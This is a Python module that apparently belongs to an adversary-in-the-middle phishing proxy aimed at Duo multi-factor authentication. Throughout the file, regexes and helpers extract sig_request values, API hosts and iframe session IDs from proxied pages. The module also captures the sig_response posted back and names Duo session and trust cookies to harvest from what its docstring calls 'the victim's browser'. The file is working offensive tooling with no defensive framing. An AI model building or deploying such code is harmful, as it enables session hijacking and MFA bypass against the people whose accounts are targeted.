"""Duo Web SDK MFA flow detection and artifact capture.

Detects sig_request (hidden input or Duo.init JS), the api host, the iframe
URL/sid, and captures sig_response from the POST back. Never rewrites
duosecurity.com URLs — the iframe must stay cross-origin to the victim's
browser.
"""
import re

DUO_API_HOST_RE = re.compile(
    r"(?:https?:)?(//)?((?:api-[a-z0-9][a-z0-9-]*|login)?\.?duosecurity\.com"
    r"(?::\d+)?(/[^\s\"'<>]*)?)", re.IGNORECASE)

SIG_REQUEST_INPUT_RE = re.compile(
    r"<input[^>]*name=[\"']sig_request[\"'][^>]*value=[\"']([^\"']+)[\"']",
    re.IGNORECASE)
SIG_REQUEST_INPUT_RE2 = re.compile(
    r"<input[^>]*value=[\"']([^\"']+)[\"'][^>]*name=[\"']sig_request[\"']",
    re.IGNORECASE)
SIG_REQUEST_JS_RE = re.compile(
    r"sig_request['\"]?\s*[:=]\s*['\"]([^'\"]+)['\"]", re.IGNORECASE)

DUO_IFRAME_RE = re.compile(
    r"<iframe[^>]*duo[^>]*src=[\"']([^\"']*duosecurity\.com[^\"']*)[\"']",
    re.IGNORECASE | re.DOTALL)

DUO_FRAME_SID_RE = re.compile(r"[?&]sid=([^&\"'\s<>]+)", re.IGNORECASE)


def is_duo_api_url(url):
    return re.search(r"duosecurity\.com", url or "", re.IGNORECASE) is not None


def extract_sig_request(text):
    for rx in (SIG_REQUEST_INPUT_RE, SIG_REQUEST_INPUT_RE2, SIG_REQUEST_JS_RE):
        m = rx.search(text or "")
        if m:
            return m.group(1)
    return None


def extract_duo_api_host(text):
    for m in DUO_API_HOST_RE.finditer(text or ""):
        host = m.group(2)
        if host.startswith("api-"):
            return host.split("/")[0].split(":")[0]
    return None


def extract_duo_iframe(text):
    m = DUO_IFRAME_RE.search(text or "")
    if not m:
        return None, None
    src = m.group(1)
    sm = DUO_FRAME_SID_RE.search(src)
    return src, (sm.group(1) if sm else None)


def detect_duo(text):
    if not text:
        return None
    sig = extract_sig_request(text)
    api = extract_duo_api_host(text)
    iframe_src, sid = extract_duo_iframe(text)
    has_frame = re.search(r"duo[_-]?iframe|Duo\.init", text, re.IGNORECASE)
    if not (sig or api or iframe_src or has_frame):
        return None
    return {
        "sig_request": sig,
        "api_host": api,
        "iframe_src": iframe_src,
        "iframe_sid": sid,
    }


def extract_sig_response(fields):
    v = fields.get("sig_response")
    return v if v else None


DUO_COOKIE_NAMES = ("duo_session", "duo_session_id", "duo_remember",
                    "duo_trust", "duo_verified", "duo_aid")


def duo_cookie_name(name):
    n = (name or "").lower()
    return n.startswith("duo") or n in ("aid",)
